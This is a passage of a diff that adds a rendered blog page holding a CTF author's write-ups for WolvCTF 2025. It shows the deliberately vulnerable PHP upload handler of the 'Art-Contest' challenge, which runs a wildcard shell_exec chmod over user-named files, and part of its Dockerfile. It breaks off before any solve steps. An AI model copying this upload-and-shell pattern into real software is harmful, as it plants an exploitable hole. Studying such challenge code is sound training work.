@@ -1,0 +1,1799 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>WolvCTF 2025 Individual Challenges &middot; dree.blog</title>
+    <meta name="title" content="WolvCTF 2025 Individual Challenges &middot; dree.blog" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
+    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8f25b3b1fdd42cfaf2092d7e98b41f6474cfaf471f6aeb265f7ba2579197e54e.css"
+    integrity="sha256-jyWzsf3ULPryCS1&#43;mLQfZHTPr0cfausmX3uiV5GX5U4="
+  />
+  
+    
+    
+    
+  
+  
+    
+    
+    
+  
+  
+    
+    
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.e2f23ac92b690a4e99ab2dffef9aa96a95f7ec39636fb9fa7eeb70d55ba347ae.js"
+      integrity="sha256-4vI6yStpCk6Zqy3/75qpapX37Dljb7n6futw1VujR64="
+      data-copy="Copy"
+      data-copied="Copied"
+    ></script>
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        Author Writeups for my individual challenges from WolvCTF 2025
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/posts/wolvctf-2025-individual/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/posts/wolvctf-2025-individual/">
+  <meta property="og:site_name" content="dree.blog">
+  <meta property="og:title" content="WolvCTF 2025 Individual Challenges">
+  <meta property="og:description" content="Author Writeups for my individual challenges from WolvCTF 2025">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-24T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-24T00:00:00+00:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Forensics">
+    <meta property="article:tag" content="OSINT">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="WolvCTF 2025 Individual Challenges">
+  <meta name="twitter:description" content="Author Writeups for my individual challenges from WolvCTF 2025">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "WolvCTF 2025 Individual Challenges",
+    "headline": "WolvCTF 2025 Individual Challenges",
+    
+    "abstract": "Author Writeups for my individual challenges from WolvCTF 2025",
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/wolvctf-2025-individual\/",
+    "author" : {
+      "@type": "Person",
+      "name": "dree"
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-03-24T00:00:00\u002b00:00",
+    "datePublished": "2025-03-24T00:00:00\u002b00:00",
+    
+    "dateModified": "2025-03-24T00:00:00\u002b00:00",
+    
+    "keywords": ["Web","Forensics","OSINT"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1187"
+  }
+  </script>
+    
+    <script type="application/ld+json">
+    {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "Welcome to Congo! Tada",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/posts/",
+       "name": "Posts",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "name": "Wolv Ctf 2025 Individual Challenges",
+       "position": 3
+     }
+   ]
+ }
+  </script>
+
+  
+  <meta name="author" content="dree" />
+  
+    
+      <link href="mailto:dree.31415@gmail.com" rel="me" />
+    
+      <link href="https://github.com/dreeSec" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >dree.blog</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/posts/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+                  <button
+                    id="search-button-1"
+                    title="Search (/)"
+                  >
+                    
+                      <span
+                        class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                      ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </button>
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/"
+      >Welcome to Congo! :tada:</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class=" inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/posts/"
+      >Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/posts/wolvctf-2025-individual/"
+      >WolvCTF 2025 Individual Challenges</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        WolvCTF 2025 Individual Challenges
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-03-24 00:00:00 &#43;0000 UTC">24 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+  
+  
+
+<span class="mb-[2px]">
+  <a
+    href="https://github.com/jpanther/congo/tree/dev/exampleSite/content/posts/WolvCTF-2025-Individual/index.md"
+    class="text-lg hover:text-primary-500"
+    rel="noopener noreferrer"
+    target="_blank"
+    title="Edit content"
+    ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M490.3 40.4C512.2 62.27 512.2 97.73 490.3 119.6L460.3 149.7L362.3 51.72L392.4 21.66C414.3-.2135 449.7-.2135 471.6 21.66L490.3 40.4zM172.4 241.7L339.7 74.34L437.7 172.3L270.3 339.6C264.2 345.8 256.7 350.4 248.4 353.2L159.6 382.8C150.1 385.6 141.5 383.4 135 376.1C128.6 370.5 126.4 361 129.2 352.4L158.8 263.6C161.6 255.3 166.2 247.8 172.4 241.7V241.7zM192 63.1C209.7 63.1 224 78.33 224 95.1C224 113.7 209.7 127.1 192 127.1H96C78.33 127.1 64 142.3 64 159.1V416C64 433.7 78.33 448 96 448H352C369.7 448 384 433.7 384 416V319.1C384 302.3 398.3 287.1 416 287.1C433.7 287.1 448 302.3 448 319.1V416C448 469 405 512 352 512H96C42.98 512 0 469 0 416V159.1C0 106.1 42.98 63.1 96 63.1H192z"/></svg>
+</span></a
+  >
+</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8">
+          <div class="toc pe-5 lg:sticky lg:top-10 print:hidden">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#art-contest">Art-Contest</a>
+      <ul>
+        <li><a href="#challenge-description">Challenge Description</a></li>
+        <li><a href="#solve">Solve</a>
+          <ul>
+            <li><a href="#file-details">File Details</a></li>
+            <li><a href="#step-1">Step 1</a></li>
+            <li><a href="#step-2">Step 2</a></li>
+            <li><a href="#step-3">Step 3</a></li>
+            <li><a href="#step-4">Step 4</a></li>
+            <li><a href="#step-5">Step 5</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#lost-2">Lost 2</a>
+      <ul>
+        <li><a href="#challenge-description-1">Challenge Description</a></li>
+        <li><a href="#solve-1">Solve</a></li>
+      </ul>
+    </li>
+    <li><a href="#passwords">Passwords</a>
+      <ul>
+        <li><a href="#challenge-description-2">Challenge Description</a></li>
+        <li><a href="#solve-2">Solve</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>Author Writeups for my individual challenges from WolvCTF 2025</p>
+<hr>
+<h2 id="art-contest" class="relative group">Art-Contest <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#art-contest" aria-label="Anchor">#</a></span></h2><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324124730_hu13625163003087534324.webp 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324124730_hu2598828379842644836.webp 660w
+            
+              
+                ,/posts/wolvctf-2025-individual/Pasted_image_20250324124730_hu3028386928530172281.webp 968w
+              
+            
+            
+              
+                ,/posts/wolvctf-2025-individual/Pasted_image_20250324124730_hu3028386928530172281.webp 968w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="968"
+        height="894"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025-individual/Pasted_image_20250324124730_hu694403438373399680.png"
+          srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324124730_hu14231259989991235609.png 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324124730_hu694403438373399680.png 660w
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324124730.png 968w
+          
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324124730.png 968w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="challenge-description" class="relative group">Challenge Description <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#challenge-description" aria-label="Anchor">#</a></span></h3><p>Submit your best ascii art to win!</p>
+<p><a href="https://art-contest-974780027560.us-east5.run.app" target="_blank" rel="noreferrer">https://art-contest-974780027560.us-east5.run.app</a></p>
+<h3 id="solve" class="relative group">Solve <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#solve" aria-label="Anchor">#</a></span></h3><h4 id="file-details" class="relative group">File Details <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#file-details" aria-label="Anchor">#</a></span></h4><p>Users are given this site</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324131316_hu9308548703324434233.webp 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324131316_hu10764036898382970732.webp 660w
+            
+              ,/posts/wolvctf-2025-individual/Pasted_image_20250324131316_hu10029570507428742339.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025-individual/Pasted_image_20250324131316_hu1075637338672895524.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2956"
+        height="1850"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025-individual/Pasted_image_20250324131316_hu6395435125908275595.png"
+          srcset="/posts/wolvctf-2025-individual/Pasted_image_20250324131316_hu18348569451380815193.png 330w,/posts/wolvctf-2025-individual/Pasted_image_20250324131316_hu6395435125908275595.png 660w
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324131316_hu16448715965759848235.png 1024w
+          
+          
+            ,/posts/wolvctf-2025-individual/Pasted_image_20250324131316_hu7772442612104399332.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>And <code>index.php</code> which contains the following PHP before the HTML</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$session_id</span> <span class="o">=</span> <span class="nx">session_id</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/uploads/</span><span class="si">$session_id</span><span class="s2">/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Creating the session-specific upload directory if it doesn&#39;t exist
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">,</span> <span class="mo">0755</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chown</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">,</span> <span class="s1">&#39;www-data&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chgrp</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">,</span> <span class="s1">&#39;www-data&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>And after</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;fileToUpload&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$target_file</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;fileToUpload&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$session_id</span> <span class="o">=</span> <span class="nx">session_id</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/uploads/</span><span class="si">$session_id</span><span class="s2">/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$target_file_path</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="o">.</span> <span class="nv">$target_file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$lastDotPosition</span> <span class="o">=</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Check if file already exists
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$target_file_path</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Sorry, file already exists.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Check file size
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;fileToUpload&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">50000</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Sorry, your file is too large.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// If the file contains no dot, evaluate just the filename
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$lastDotPosition</span> <span class="o">==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$lastDotPosition</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$extension</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$lastDotPosition</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="nv">$lastDotPosition</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Ensure that the extension is a txt file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$extension</span> <span class="o">!==</span> <span class="s1">&#39;&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$extension</span> <span class="o">!==</span> <span class="s1">&#39;txt&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Sorry, only .txt extensions are allowed.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-f0-9]{32}$/&#39;</span><span class="p">,</span> <span class="nv">$session_id</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">echo</span> <span class="s2">&#34;Sorry, that is not a valid session ID.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Check if $uploadOk is set to 0 by an error
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$uploadOk</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Sorry, your file was not uploaded.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// If everything is ok, try to upload the file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;fileToUpload&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="nv">$target_file_path</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;The file &#34;</span> <span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;fileToUpload&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]))</span> <span class="o">.</span> <span class="s2">&#34; has been uploaded.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;Sorry, there was an error uploading your file.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$old_path</span> <span class="o">=</span> <span class="nx">getcwd</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// make unreadable - the proper way
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;chmod -- 000 *&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nv">$old_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>And the <code>Dockerfile</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> php:8.4-apache</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Install cron</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> apt-get update <span class="o">&amp;&amp;</span> apt-get install -y cron <span class="o">&amp;&amp;</span> rm -rf /var/lib/apt/lists/*<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Copy the index page</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> index.php /var/www/html/index.php<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Create the uploads directory and make it unreadable but writeable</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> mkdir -p /var/www/html/uploads <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chown root:www-data /var/www/html/uploads <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chmod <span class="m">730</span> /var/www/html/uploads<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Make /var/www/html/ only readable</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chown root:www-data /var/www/html/ <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>    chmod <span class="m">750</span> /var/www/html/<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Copy flag.txt over</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> flag.txt /var/www/html/flag.txt<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chown root:root /var/www/html/flag.txt <span class="o">&amp;&amp;</span> <span class="se">\
